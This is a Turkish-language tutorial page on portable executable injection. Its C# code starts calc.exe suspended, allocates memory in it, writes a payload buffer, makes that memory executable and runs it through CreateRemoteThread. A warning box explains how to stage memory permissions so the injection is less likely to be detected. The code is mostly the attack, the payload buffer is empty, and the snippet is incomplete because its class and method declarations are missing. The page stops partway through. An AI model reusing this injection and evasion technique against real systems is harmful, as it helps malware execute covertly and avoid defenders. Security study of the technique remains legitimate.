# Portable Executable Injection

## Scenario

Payload, hedef işlem adres uzayında tahsis edilen belleğe kopyalanır. Ardından çalıştırılır.

## Case Study

* Console App (.NET Framework 4.7.2)
* Release, x64
* PEInjection.sln

## Code

```cs title="Program.cs" linenums="1"

using System.Runtime.InteropServices;

namespace PEInjection
{

        {
            byte[] buf = new byte[] { };

            STARTUPINFOA startupInfo = new STARTUPINFOA();
            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
            CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\calc.exe", IntPtr.Zero, IntPtr.Zero, false, 0x08000000 | 0x00000008, IntPtr.Zero, IntPtr.Zero, ref startupInfo, out processInfo);

            IntPtr lpBaseAddress = VirtualAllocEx(processInfo.hProcess, IntPtr.Zero, (uint)buf.Length, 0x00001000 | 0x00002000, 0x04);

            IntPtr outSize;
            WriteProcessMemory(processInfo.hProcess, lpBaseAddress, buf, buf.Length, out outSize);

            uint lpflOldProtect;
            VirtualProtectEx(processInfo.hProcess, lpBaseAddress, (uint)buf.Length, 0x20, out lpflOldProtect);

            IntPtr hThread = CreateRemoteThread(processInfo.hProcess, IntPtr.Zero, 0, lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }
```

### Memory Allocation

Payload için hedef işlem adres uzayında okuma/yazma destekli bir bellek tahsis edilir:

!!! danger

    Sadece okuma/yazma desteği eklendi, yürütme desteği sonradan eklendi. Tek seferde okuma/yazma/yürütme desteği eklemek tespit edilme riskini artırabilir.

| MEMORY PROTECTION CONSTANT | VALUE |
|---|---|
| [PAGE_READWRITE](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants#constants) | 0x04 |

```cs title="Program.cs" linenums="63"
IntPtr lpBaseAddress = VirtualAllocEx(processInfo.hProcess, IntPtr.Zero, (uint)buf.Length, 0x00001000 | 0x00002000, 0x04);
```

Payload, hedef işlem adres uzayında tahsis edilen belleğe kopyalanır:


